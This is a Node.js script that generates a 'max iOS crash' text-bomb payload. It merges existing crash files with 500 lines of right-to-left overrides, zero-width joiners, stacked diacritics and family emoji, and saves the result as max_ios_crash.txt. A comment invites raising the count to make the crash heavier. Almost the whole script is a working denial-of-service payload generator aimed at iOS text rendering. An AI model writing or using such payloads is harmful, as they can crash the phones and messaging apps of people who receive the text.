import fs from "fs";
import path from "path";

const bugsFolder = path.join(process.cwd(), "bugs");
if (!fs.existsSync(bugsFolder)) fs.mkdirSync(bugsFolder);

// List of crash files to combine
const crashFiles = [
  "combo_invisible.txt",
  "singleline_crash.txt",
  "mentions.json"
];

let combinedPayload = "";

// Append existing crash files
for (const file of crashFiles) {
  const filePath = path.join(bugsFolder, file);
  if (fs.existsSync(filePath)) {
    combinedPayload += fs.readFileSync(filePath, "utf8") + "\n";
  }
}

// Add aggressive iOS Unicode + emoji payload
const rtl = "\u202E";      // Right-to-left override
const lrm = "\u200E";      // Left-to-right mark
const zwj = "\u200D";      // Zero-width joiner
const zwnj = "\u200C";     // Zero-width non-joiner
const diacritics = "\u0300\u0301\u0302\u0303\u0304"; // stacked accents
const emoji = "👨‍👩‍👧‍👦"; // ZWJ emoji family

for (let i = 0; i < 500; i++) {  // increase to make crash heavier
  combinedPayload += rtl + emoji + diacritics.repeat(5) + zwj + zwnj + lrm + "\n";
}

// Save the max crash file
const outPath = path.join(bugsFolder, "max_ios_crash.txt");
fs.writeFileSync(outPath, combinedPayload, "utf8");

console.log(`✅ Max iOS crash payload created at ${outPath} | Length: ${combinedPayload.length}`);
